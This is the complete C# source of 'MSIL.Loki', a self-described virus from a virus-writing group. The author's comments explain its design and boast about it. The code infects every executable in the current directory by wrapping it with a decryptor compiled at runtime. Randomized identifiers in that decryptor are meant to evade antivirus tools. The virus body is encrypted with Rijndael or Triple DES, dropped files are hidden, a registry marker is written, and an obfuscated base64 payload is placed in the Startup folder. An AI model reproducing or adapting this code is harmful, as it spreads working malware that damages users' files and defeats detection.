   /*************************************************************
    * C# - MSIL.Loki
    * >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    * by free0n
    * vx13d.net free0n@vx13d.net | DoomRiderz www.doomriderz.com
    * ###########################################################
    * ++LOKI++
    *
    * Loki is a .net C# virus that will infect all the executables
    * found in the current directory. The file infection is unique
    * as it has the advantage to be able to decrypt/encrypt the
    * virus body based on Rijandel or Triple DES. Both encryptions
    * generate their keys dynamically
    *
    *  How is it able to encrypt itself and still work?
    *  Well Loki can build a decryptor at runtime! duh! :) this is
    *  something I haven't seen yet so I might be the first
    *
    *  It basically works like this
    *  1. generate decryptor
    *  2. generate encrypted virus
    *  3. Infect file
    *
    * The file structure of an infected file looks like this.
    *  - decryptor
    *  - original host program
    *  - encrypted virus
    *
    * Note: The decryptor gets put in first so it gets executed first.
    *
    * The decryptor that we generate on the fly has 2 responsibilities
    * 1. Extract host program from itself and run it
    * 2. Then once the host program has finished running decrypt
    *    the virus and execute it.
    *
    * since we build it from source we can change variable names
    * in the decryptor making it even more harder to find!
    *
    * The other cool part is the payload. If Loki hasn't ran
    * before or the reg key gets deleted it will create a screensaver
    * and dump it into the startup directory. So the next time
    * the user restarts their computer their screen will turn black
    * and a Red message saying
    * "You have been infected with MSIL.Loki by free0n" will bounce
    * across the screen muwhahaha it's pretty funny.
    *
    * Note: Yes this looks like a console application which
    * would have a command prompt or dos box open but with
    * Loki you create the Console application then change
    * the output type to windows form (its in project properties).
    * This makes it so it still runs like a console app but
    * no dos box opens making it a little more sneaky
    * Use VC# express to build...
    *
    * Lates!
    * >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    ************************************************************/

   /************************************************************
    * Start of Program.cs
    * >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    ************************************************************/
   using System;
   using System.Collections.Generic;
   using System.Text;
   using System.IO;

   namespace Loki {
       class Program {
           static void Main(string[] args) {
                Loki loki = new Loki();
               //decide which encryption/decryption to use
               //based on if the random number is even or odd
               Random r = new Random();
               int e = 0;
               if (r.Next(100) % 2 == 0) {
                   e = 1;
               }
               //generate a key based on e
               loki.Generatekey(e);

               //populate the current directory
               loki.Populate(Directory.GetCurrentDirectory());

               //check to see if we already have ran
               //if we haven't then build our kick ass message!
               if(!loki.Check()) {
                   loki.GenerateMsg();
               }
           }
       }
   }


   /************************************************************
    * Start of Loki.cs
    * >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    ************************************************************/
   using System;
   using System.Collections.Generic;
   using System.Text;
   using System.Reflection;
   using System.Reflection.Emit;
   using System.IO;
   using System.Threading;
   using Microsoft.CSharp;
   using System.CodeDom.Compiler;
   using System.Diagnostics;
   using System.Security.Cryptography;
   using Microsoft.Win32;

   namespace Loki {

       class Loki {

           private int encm = 0;
           private string k = null;
           private string iv = null;

           public void Populate(string dir) {
               if (Directory.Exists(dir)) {
                   string[] files = Directory.GetFiles(dir, "*.exe");
                   for (int i = 0; i < files.Length; i++) {
                       try {
                           byte[] hostbytes = read(files[i]);
                           if (hostbytes[60] != 128) {
                               Random rand = new Random();
                               int b = rand.Next(1000);

                               string cf = Convert.ToString(Process.GetCurrentProcess().MainModule.FileName);
                               string nf = Directory.GetCurrentDirectory() + "\\" + Rand() + ".exe";
                               string ef = Directory.GetCurrentDirectory() + "\\" + Rand() + DateTime.Now.Year + ".exe";

                               byte[] enc = read(cf);
                               FileStream fs = new FileStream(nf, FileMode.CreateNew);
                               BinaryWriter bw = new BinaryWriter(fs);
                               for (int x = 0; x < enc.Length; x++) {
                                   bw.BaseStream.WriteByte(enc[x]);
                               }
                               bw.Close();
                               fs.Close();

                               Encrypt(nf, ef, encm);

                               if (File.Exists(ef)) {
                                   if (File.Exists(nf)) {
                                       File.Delete(nf);
                                   }

                                   FileInfo fi = new FileInfo(files[i]);
                                   int len = (int)fi.Length;
                                   string df = Decryptor(ef, 5632, (len + 5632), encm);

                                   if (File.Exists(df)) {
                                       byte[] byteDec = read(df);
                                       byte[] byteEnc = read(ef);

                                       if(File.Exists(files[i])) {
                                           File.Delete(files[i]);

                                           FileStream fsb = new FileStream(files[i], FileMode.CreateNew);
                                           BinaryWriter bwb = new BinaryWriter(fsb);

                                           for (int x = 0; x < byteDec.Length; x++) {
                                               bwb.BaseStream.WriteByte(byteDec[x]);
                                           }
                                           for (int w = 0; w < hostbytes.Length; w++) {
                                               bwb.BaseStream.WriteByte(hostbytes[w]);
                                           }
                                           for (int z = 0; z < byteEnc.Length; z++) {
                                               bwb.BaseStream.WriteByte(byteEnc[z]);
                                           }

                                           bwb.Close();
                                           fsb.Close();

                                           File.Delete(ef);
                                           File.Delete(df);
                                       }
                                   } else {
                                       if(File.Exists(ef)) {
                                           File.Delete(ef);
                                       }
                                   }
                               }
                           }

                       } catch { }
                   }
               }
           }

           public byte[] read(string d) {
           //simply reads a file and returns it as a byte array
               FileStream fs = new FileStream(d, FileMode.Open, FileAccess.Read);
               BinaryReader br = new BinaryReader(fs);
               byte[] b = new byte[fs.Length];
               for (int f = 0; f < b.Length; f++) {
                   b[f] = br.ReadByte();
               }
               br.Close();
               fs.Close();
               return b;
           }

           public void Encrypt(string inf, string outf, int e) {
           //based on e we decide which encryption that we are
               //going to use for the virus. Since C# had a crypto
               //package I thought we try those out.
               if (e == 1) {
                   try {
                       string p = getKey();

                       if (p.Length > 8)
                           p = p.Substring(0, 8);
                       else if (p.Length < 8) {
                           int add = 8 - p.Length;
                           for (int i = 0; i < add; i++)
                               p = p + i;
                       }
                       UnicodeEncoding UE = new UnicodeEncoding();
                       byte[] key = UE.GetBytes(p);

                       FileStream fsc = new FileStream(outf, FileMode.Create);
                       RijndaelManaged cr = new RijndaelManaged();
                       CryptoStream cs = new CryptoStream(fsc, cr.CreateEncryptor(key, key), CryptoStreamMode.Write);
                       FileStream fsIn = new FileStream(inf, FileMode.Open);
                       int d;
                       while ((d = fsIn.ReadByte()) != -1) {
                           cs.WriteByte((byte)d);
                       }
                       fsIn.Close();
                       cs.Close();
                       fsc.Close();

                   } catch { }

               } else {
                   try {

                       byte[] b = read(inf);
                       byte[] key = Convert.FromBase64String(getKey());
                       byte[] IV = Convert.FromBase64String(getIV());

                       FileStream fs = File.Open(outf, FileMode.OpenOrCreate);
                       CryptoStream cs = new CryptoStream(fs, new TripleDESCryptoServiceProvider().CreateEncryptor(key, IV), CryptoStreamMode.Write);
                       BinaryWriter bw = new BinaryWriter(cs);
                       bw.Write(b);
                       bw.Close();
                       cs.Close();
                       fs.Close();

                   } catch { }
               }
           }

           public string Decryptor(string f, int num, int hl, int e) {
           //this is the decryptor that we build on the fly
           //since we build it on the fly we can easily change
               //variables making our application different each
               //time we run it. When i was actually building it I got a
           //false positive from my A.V. that said it was another virus
           //which is kind of interesting...

               string name = Directory.GetCurrentDirectory() + "\\" +  Rand()  + DateTime.Now.Year + ".exe";
               ICodeCompiler ic = new CSharpCodeProvider().CreateCompiler();
               CompilerParameters cp = new CompilerParameters();
               cp.ReferencedAssemblies.Add("System.dll");
               cp.ReferencedAssemblies.Add("System.Windows.Forms.dll");
               cp.GenerateExecutable = true;
               cp.CompilerOptions = "/target:winexe";
               cp.OutputAssembly = name;

               Random r = new Random();

               string n = Rand() + r.Next(100);
               string n2 = Rand() + hl;
               string r2 = Rand() + r.Next(hl);

               string d = "\n" +
               "using System; \n" +
               "using System.Windows.Forms; \n" +
               "using System.Security.Cryptography; \n" +
               "using System.Text; \n" +
               "using System.Diagnostics; \n" +
               "using System.IO; \n" +
               "using System.Threading; \n" +
               "namespace " + n + " { \n" +
               "   class " + n + n2 + ": Form { \n" +

               "       static string cf = Convert.ToString(Process.GetCurrentProcess().MainModule.FileName); \n" +
               "       static string inf = @\"" + f + "\"; \n" +
               "       static string outf = @\"" + n2 + ".exe\"; \n" +
               "       static string tmp = @\"" + n2 + r2 + ".exe\"; \n";

               if (e == 1) {
                   d += "static string p = @\"" + getKey() + "\"; \n";
               } else {
                   d += "static byte[] Key = Convert.FromBase64String(\"" + getKey() + "\"); \n" +
                        "static byte[] IV  = Convert.FromBase64String(\"" + getIV() + "\"); \n";
               }

               d += "  public static void Main() { \n" +
               "             " + r2 + "(); \n" +
               "       } \n" +
               "       private static void " + r2 + "() { \n" +
               "           try { \n " +

                               //read current file into byte array
               "               FileStream fs = new FileStream(cf, FileMode.Open, FileAccess.Read); \n" +
               "               BinaryReader brb = new BinaryReader(fs); \n" +
               "               byte[] b = new byte[fs.Length]; \n" +
               "               for (int q = 0; q < b.Length; q++) { \n" +
               "                   b[q] = brb.ReadByte(); \n" +
               "               } \n" +
               "               brb.Close(); \n" +
               "               fs.Close(); \n" +

                               //write temp host program
               "               FileStream fsb = new FileStream(tmp, FileMode.CreateNew); \n" +
               "               BinaryWriter bwb = new BinaryWriter(fsb); \n" +
               "               for (int z = " + num + "; z < " + hl + "; z++) { \n" +
               "                    bwb.BaseStream.WriteByte(b[z]); \n" +
               "               } \n " +
               "               fsb.Close(); \n" +
               "               bwb.Close(); \n" +
               "               File.SetAttributes(tmp, FileAttributes.Hidden); \n" +

                               //start temp program and wait for it to exit
               "               try { \n" +
               "                   Process.Start(tmp).WaitForExit(); \n" +
               "                   File.Delete(tmp); \n" +
               "               } catch { } \n" +

                               //read encrypted version and write to a file
               "               FileStream fb = new FileStream(inf, FileMode.CreateNew); \n" +
               "               BinaryWriter bw = new BinaryWriter(fb); \n" +
               "               for (int z = " + hl + "; z < b.Length; z++) { \n" +
               "                    bw.BaseStream.WriteByte(b[z]); \n" +
               "               } \n " +
               "               fb.Close(); \n" +
               "               bw.Close(); \n" +
               "               File.SetAttributes(inf, FileAttributes.Hidden); \n";

               if (e == 1) {
                   d += "      if(p.Length > 8) { \n" +
                        "          p = p.Substring(0,8); \n" +
                        "      } else if(p.Length < 8) { \n" +
                        "          int a = 8 - p.Length; \n" +
                        "          for(int i = 0; i < a; i++) \n" +
                        "              p = p + i; \n" +
                        "      } \n" +
                        "      UnicodeEncoding UE = new UnicodeEncoding(); \n" +
                        "      byte[] k = UE.GetBytes(p); \n" +
                        "      FileStream fr = new FileStream(inf, FileMode.Open); \n" +
                        "      RijndaelManaged r = new RijndaelManaged(); \n" +
                        "      CryptoStream cs = new CryptoStream(fr, r.CreateDecryptor(k, k), CryptoStreamMode.Read); \n" +
                        "      if(File.Exists(outf)) { \n" +
                        "          File.Delete(outf); \n" +
                        "      } \n" +
                        "      FileStream o = new FileStream(outf, FileMode.Create); \n" +
                        "      int data; \n" +
                        "      while((data = cs.ReadByte()) != -1) { \n" +
                        "          o.WriteByte((byte)data); \n" +
                        "      } \n" +
                        "      o.Close(); \n" +
                        "      cs.Close(); \n" +
                        "      fr.Close(); \n";
               } else {
                   d += "      FileStream fr = new FileStream(inf, FileMode.Open); \n" +
                        "      CryptoStream cs = new CryptoStream(fr, new TripleDESCryptoServiceProvider().CreateDecryptor(Key, IV), CryptoStreamMode.Read); \n" +
                        "      if(File.Exists(outf)) { \n" +
                        "          File.Delete(outf); \n" +
                        "      } \n" +

                        "      FileStream o = new FileStream(outf, FileMode.Create); \n" +
                        "      int data; \n " +
                        "      while((data = cs.ReadByte()) != -1) { \n" +
                        "          o.WriteByte((byte)data); \n" +
                        "      } \n" +
                        "      o.Close(); \n" +
                        "      cs.Close(); \n" +
                        "      fr.Close(); \n";
               }

               d += "          if(File.Exists(inf)) { \n" +
               "                   File.Delete(inf); \n" +
               "               } \n" +
               "               Thread t = new Thread(new ThreadStart(" + r2 + n2 + ")); \n" +
               "               t.Start(); \n" +
               "           } catch (Exception er) { \n  \n } \n" +
               "       } \n" +
               "       private static void " + r2 + n2 + "() { \n" +
               "           try { \n" +
               "               Process.Start(outf).WaitForExit(); \n" +
               "               File.Delete(outf); \n" +
               "           } catch { } \n" +
               "       } \n" +
               "       \n" +
               "   } \n" +
               "} \n";

               CompilerResults results = ic.CompileAssemblyFromSource(cp, d);
           //check to make the sure the file is there if it is then set it to hidden
           //note:the key that we use may sometimes generate characters that will escape
               //the string. I didn't bother fixing this only because it makes it more of a
           //sparse infector. Granted it won't happen everytime but just a weird quirk

           if(File.Exists(name)) {
                   File.SetAttributes(name, FileAttributes.Hidden);
               }
               return name;
           }

           public string Rand() {
           //generator of random words!
               string c = "abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNOPQRSTUVWXYZ";
               Random r = new Random();
               string n = "";
               for (int i = 0; i < r.Next(100); i++) {
                   n += c[r.Next(c.Length)];
               }
               return n;
           }

           public void Generatekey(int e) {
           //based on which encryption we use we can build our keys dynamically also
               if (e == 1) {
                   DESCryptoServiceProvider desCrypto = (DESCryptoServiceProvider)DESCryptoServiceProvider.Create();
                   setKey(ASCIIEncoding.ASCII.GetString(desCrypto.Key));
                   setEncm(e);
               } else {
                   TripleDESCryptoServiceProvider tDESalg = new TripleDESCryptoServiceProvider();
                   setKey(Convert.ToBase64String(tDESalg.Key));
                   setIV(Convert.ToBase64String(tDESalg.IV));
                   setEncm(e);
               }
           }

           public bool Check() {
               //our check to the registry if we ran it already
               //all this decides is if we show our message since
               //we don't really need to everytime an infected file is launched
               //although it would be annoying enough...

               string regstr = (string)Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Loki", "Loki", "Loki");
               if (regstr == "Loki") {
                   return true;
               } else {
                   RegistryKey key = Registry.LocalMachine.OpenSubKey("Software", true);
                   RegistryKey newkey = key.CreateSubKey("Loki");
                   newkey.SetValue("Loki", "Loki");
                   return false;
               }
           }

           public void GenerateMsg() {

               //this is cool. it's a little screensaver
               //that gets built dynamically. That says You've been infected
               //with Msil.Loki by free0n. It even jumps around the screen
               //:) Nice to try new things instead of just a message box

               ICodeCompiler ic = new CSharpCodeProvider().CreateCompiler();
               CompilerParameters cp = new CompilerParameters();
               Random r = new Random();
               string n = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + r.Next(100000) + ".exe";
               cp.ReferencedAssemblies.Add("System.dll");
               cp.ReferencedAssemblies.Add("System.Windows.Forms.dll");
               cp.ReferencedAssemblies.Add("System.Data.dll");
               cp.ReferencedAssemblies.Add("System.Drawing.dll");
               cp.GenerateExecutable = true;
               cp.CompilerOptions = "/target:winexe";
               cp.OutputAssembly = n;

               string d = DeCode("dXNpbmcgU3lzdGVtOyAKdXNpbmcgU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWM7" +
                                 "IAp1c2luZyBTeXN0ZW0uQ29tcG9uZW50TW9kZWw7IAp1c2luZyBTeXN0ZW0uRGF0" +
                                 "YTsgCnVzaW5nIFN5c3RlbS5EcmF3aW5nOyAKdXNpbmcgU3lzdGVtLlRleHQ7IAp1" +
                                 "c2luZyBTeXN0ZW0uV2luZG93cy5Gb3JtczsgCm5hbWVzcGFjZSBzY3IgeyAKc3Rh" +
                                 "dGljIGNsYXNzIFByb2dyYW0gewogICBbU1RBVGhyZWFkXQogICBzdGF0aWMgdm9p" +
                                 "ZCBNYWluKCkgewpBcHBsaWNhdGlvbi5FbmFibGVWaXN1YWxTdHlsZXMoKTsKQXBw" +
                                 "bGljYXRpb24uU2V0Q29tcGF0aWJsZVRleHRSZW5kZXJpbmdEZWZhdWx0KGZhbHNl" +
                                 "KTsKQXBwbGljYXRpb24uUnVuKG5ldyBGb3JtMSgpKTsgCn0gCn0gCnBhcnRpYWwg" +
                                 "Y2xhc3MgRm9ybTEgewpwcml2YXRlIFN5c3RlbS5Db21wb25lbnRNb2RlbC5JQ29u" +
                                 "dGFpbmVyIGNvbXBvbmVudHMgPSBudWxsOwpwcm90ZWN0ZWQgb3ZlcnJpZGUgdm9p" +
                                 "ZCBEaXNwb3NlKGJvb2wgZGlzcG9zaW5nKSB7CmlmIChkaXNwb3NpbmcgJiYgKGNv" +
                                 "bXBvbmVudHMgIT0gbnVsbCkpIHsKY29tcG9uZW50cy5EaXNwb3NlKCk7Cn0KYmFz" +
                                 "ZS5EaXNwb3NlKGRpc3Bvc2luZyk7Cn0KcHJpdmF0ZSB2b2lkIEluaXRpYWxpemVD" +
                                 "b21wb25lbnQoKSB7CnRoaXMuY29tcG9uZW50cyA9IG5ldyBTeXN0ZW0uQ29tcG9u" +
                                 "ZW50TW9kZWwuQ29udGFpbmVyKCk7CnRoaXMubGFiZWwxID0gbmV3IFN5c3RlbS5X" +
                                 "aW5kb3dzLkZvcm1zLkxhYmVsKCk7CnRoaXMudGltZXIxID0gbmV3IFN5c3RlbS5X" +
                                 "aW5kb3dzLkZvcm1zLlRpbWVyKHRoaXMuY29tcG9uZW50cyk7CnRoaXMuU3VzcGVu" +
                                 "ZExheW91dCgpOwp0aGlzLmxhYmVsMS5BdXRvU2l6ZSA9IHRydWU7CnRoaXMubGFi" +
                                 "ZWwxLkJhY2tDb2xvciA9IFN5c3RlbS5EcmF3aW5nLkNvbG9yLkJsYWNrOwp0aGlz" +
                                 "LmxhYmVsMS5Gb250ID0gbmV3IFN5c3RlbS5EcmF3aW5nLkZvbnQoIk1pY3Jvc29m" +
                                 "dCBTYW5zIFNlcmlmIiwgMjRGLCBTeXN0ZW0uRHJhd2luZy5Gb250U3R5bGUuUmVn" +
                                 "dWxhciwgU3lzdGVtLkRyYXdpbmcuR3JhcGhpY3NVbml0LlBvaW50LCAoKGJ5dGUp" +
                                 "KDApKSk7CnRoaXMubGFiZWwxLkZvcmVDb2xvciA9IFN5c3RlbS5EcmF3aW5nLkNv" +
                                 "bG9yLlJlZDsKdGhpcy5sYWJlbDEuTG9jYXRpb24gPSBuZXcgU3lzdGVtLkRyYXdp" +
                                 "bmcuUG9pbnQoMTIsIDIwMSk7CnRoaXMubGFiZWwxLk5hbWUgPSAibGFiZWwxIjsK" +
                                 "dGhpcy5sYWJlbDEuU2l6ZSA9IG5ldyBTeXN0ZW0uRHJhd2luZy5TaXplKDAsIDM3" +
                                 "KTsKdGhpcy5sYWJlbDEuVGFiSW5kZXggPSAwOwp0aGlzLnRpbWVyMS5UaWNrICs9" +
                                 "IG5ldyBTeXN0ZW0uRXZlbnRIYW5kbGVyKHRoaXMudGltZXIxX1RpY2spOwp0aGlz" +
                                 "LkF1dG9TY2FsZURpbWVuc2lvbnMgPSBuZXcgU3lzdGVtLkRyYXdpbmcuU2l6ZUYo" +
                                 "NkYsIDEzRik7CnRoaXMuQXV0b1NjYWxlTW9kZSA9IFN5c3RlbS5XaW5kb3dzLkZv" +
                                 "cm1zLkF1dG9TY2FsZU1vZGUuRm9udDsKdGhpcy5CYWNrZ3JvdW5kSW1hZ2VMYXlv" +
                                 "dXQgPSBTeXN0ZW0uV2luZG93cy5Gb3Jtcy5JbWFnZUxheW91dC5TdHJldGNoOwp0" +
                                 "aGlzLkNsaWVudFNpemUgPSBuZXcgU3lzdGVtLkRyYXdpbmcuU2l6ZSg0NzIsIDQ1" +
                                 "OSk7CnRoaXMuQ29udHJvbHMuQWRkKHRoaXMubGFiZWwxKTsKdGhpcy5Eb3VibGVC" +
                                 "dWZmZXJlZCA9IHRydWU7CnRoaXMuRm9ybUJvcmRlclN0eWxlID0gU3lzdGVtLldp" +
                                 "bmRvd3MuRm9ybXMuRm9ybUJvcmRlclN0eWxlLk5vbmU7CnRoaXMuTmFtZSA9ICJG" +
                                 "b3JtMSI7CnRoaXMuU2hvd0luVGFza2JhciA9IGZhbHNlOwp0aGlzLlRvcE1vc3Qg" +
                                 "PSB0cnVlOwp0aGlzLldpbmRvd1N0YXRlID0gU3lzdGVtLldpbmRvd3MuRm9ybXMu" +
                                 "Rm9ybVdpbmRvd1N0YXRlLk1heGltaXplZDsKdGhpcy5Mb2FkICs9IG5ldyBTeXN0" +
                                 "ZW0uRXZlbnRIYW5kbGVyKHRoaXMuRm9ybTFfTG9hZF8xKTsKdGhpcy5SZXN1bWVM" +
                                 "YXlvdXQoZmFsc2UpOwp0aGlzLlBlcmZvcm1MYXlvdXQoKTsKfQpwcml2YXRlIFN5" +
                                 "c3RlbS5XaW5kb3dzLkZvcm1zLkxhYmVsIGxhYmVsMTsKcHJpdmF0ZSBTeXN0ZW0u" +
                                 "V2luZG93cy5Gb3Jtcy5UaW1lciB0aW1lcjE7Cn0gCnB1YmxpYyBwYXJ0aWFsIGNs" +
                                 "YXNzIEZvcm0xIDogRm9ybSB7IApwdWJsaWMgRm9ybTEoKSB7IApJbml0aWFsaXpl" +
                                 "Q29tcG9uZW50KCk7IAp9IApwcm90ZWN0ZWQgb3ZlcnJpZGUgdm9pZCBPblBhaW50" +
                                 "QmFja2dyb3VuZChQYWludEV2ZW50QXJncyBlKSB7IAplLkdyYXBoaWNzLkRyYXdS" +
                                 "ZWN0YW5nbGUobmV3IFBlbihDb2xvci5CbGFjayksIDAsIDAsIFNpemUuV2lkdGgs" +
                                 "IFNpemUuSGVpZ2h0KTsgCn0gCnByaXZhdGUgdm9pZCBGb3JtMV9Mb2FkXzEob2Jq" +
                                 "ZWN0IHNlbmRlciwgRXZlbnRBcmdzIGUpIHsgCnRoaXMuU2V0U3R5bGUoQ29udHJv" +
                                 "bFN0eWxlcy5PcHRpbWl6ZWREb3VibGVCdWZmZXIgfCBDb250cm9sU3R5bGVzLlVz" +
                                 "ZXJQYWludCB8IENvbnRyb2xTdHlsZXMuQWxsUGFpbnRpbmdJbldtUGFpbnQsIHRy" +
                                 "dWUpOyAKdGhpcy5DYXB0dXJlID0gdHJ1ZTsgCkN1cnNvci5IaWRlKCk7IApCb3Vu" +
                                 "ZHMgPSBTY3JlZW4uUHJpbWFyeVNjcmVlbi5Cb3VuZHM7IApXaW5kb3dTdGF0ZSA9" +
                                 "IEZvcm1XaW5kb3dTdGF0ZS5NYXhpbWl6ZWQ7IApTaG93SW5UYXNrYmFyID0gZmFs" +
                                 "c2U7IApEb3VibGVCdWZmZXJlZCA9IHRydWU7IApCYWNrZ3JvdW5kSW1hZ2VMYXlv" +
                                 "dXQgPSBJbWFnZUxheW91dC5TdHJldGNoOyAKdGltZXIxLkludGVydmFsID0gMTAw" +
                                 "MDsgCnRpbWVyMS5TdGFydCgpOyAKfSAKcHJpdmF0ZSB2b2lkIHNjcm9sbCgpIHsg" +
                                 "CmxhYmVsMS5UZXh0ID0gIkluZmVjdGVkIHdpdGggTVNJTC5Mb2tpIGJ5IGZyZWUw" +
                                 "biB8IERvb21SaWRlcnoiOyAKUmFuZG9tIHIgPSBuZXcgUmFuZG9tKCk7IApsYWJl" +
                                 "bDEuU2V0Qm91bmRzKHIuTmV4dCgxMDApLCByLk5leHQoMTAwMCksIHIuTmV4dCgx" +
                                 "MDAwKSwgci5OZXh0KDEwMDApKTsKfQpwcml2YXRlIHZvaWQgdGltZXIxX1RpY2so" +
                                 "b2JqZWN0IHNlbmRlciwgRXZlbnRBcmdzIGUpIHsKc2Nyb2xsKCk7Cn0KfSAKfSAK");

               CompilerResults results = ic.CompileAssemblyFromSource(cp, d);

           }

           private string DeCode(string s) {
           byte[] decbuff = Convert.FromBase64String(s);
               return Encoding.UTF8.GetString(decbuff);
           }


       //i used to be a java programmer and I still like this way more for get/set methods
           //somethings i guess are hard to break :)

           public string getKey() {
               return k;
           }

           public void setKey(string key) {
               k = key;
           }

           public string getIV() {
               return iv;
           }

           public void setIV(string i) {
               iv = i;
           }

           public int getEncm() {
               return encm;
           }

           public void setEncm(int s) {
               encm = s;
           }
       }
   }
